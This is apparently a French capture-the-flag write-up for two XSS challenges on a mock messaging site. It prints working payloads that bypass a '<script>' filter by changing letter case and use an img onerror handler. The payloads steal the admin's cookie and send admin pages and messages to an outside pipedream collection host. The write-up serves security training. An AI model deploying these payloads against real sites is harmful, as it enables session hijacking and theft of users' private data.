# Whatsup 1

Les failles XSS consistent à executer du code sur la machine d'un autre utilisateur et potentielement un utilisateur qui possède des droits plus élevés.

Nous avons donc pensé à récupérer le cookie de l'admin via une faille XSS.

Le site est un site de messagerie semblable à whatsapp ou messenger. 
Alors on a envoyé un message avec un script js à l'admin. Le but était de récupérer son cookie d'authentification et l'envoyer à un serveur.

```
<sCriPt>fetch("//eornrwibpnp988b.m.pipedream.net",{method:"POST",body:document.cookie;});</ScRipt>
```
Il y avait un mécanisme de sécurité sensé evitér les faille XSS en empêchant d'écrire `<script>` mais nous l'avons bypass en écrivant `<sCriPt>`.

Nous avons ouvert un serveur pipedream pour récuperer ce cookie et cela a bien fonctionné.

NB:

Il nous a fallu du temps avant de comprendre qu'il fallait récupérer le cookie car, de notre côté, il avait le flag `Secure` qui empêche Javascript d'y acceder.

Nous avons donc acceder aux messages de l'admin, d'envoyer des messages en tant qu'admin et d'accèder à la page admin.html.

```
<sCriPt>fetch("//whatsup.secu-web.blackfoot.dev/admin",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eornrwibpnp988b.m.pipedream.net",{method:"POST",body:e})}));</ScRipt>
<sCriPt>fetch("/admin",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eornrwibpnp988b.m.pipedream.net",{method:"POST",body:e})}));</ScRipt>
<sCriPt>fetch("/messages",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eornrwibpnp988b.m.pipedream.net",{method:"POST",body:e})}));</ScRipt>
<sCriPt>fetch("/messages/116",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eornrwibpnp988b.m.pipedream.net",{method:"POST",body:e})}));</ScRipt>
<sCriPt>fetch("/",{method:"GET"}).then((e=>e.text())).then((e=>{fetch("//eornrwibpnp988b.m.pipedream.net",{method:"POST",body:e})}));</ScRipt>
<sCriPt>fetch("/admin",{method:"POST",body:""}).then((e=>e.text())).then((e=>{fetch("//eornrwibpnp988b.m.pipedream.net",{method:"POST",body:e})}));</ScRipt>
<sCriPt>fetch("http://whatsup:8000/admin%22,%7Bmethod:%22GET%22%7D).then((e=%3Ee.text())).then((e=%3E%7Bfetch(%22http://eornrwibpnp988b.m.pipedream.net%22,%7Bmethod:%22POST%22,body:e%7D)%7D));</ScRipt>
```

# Whatsup 2

Exactement la même manipulation mais en cachant le script js dans une image.

```
src = "x " onerror ="var sdfd=['\x69'];function e(){  fetch('//eotuo54cchosrud.m.pipedream.net',{method:'POST',body:document.cookie}) }e()    "
```
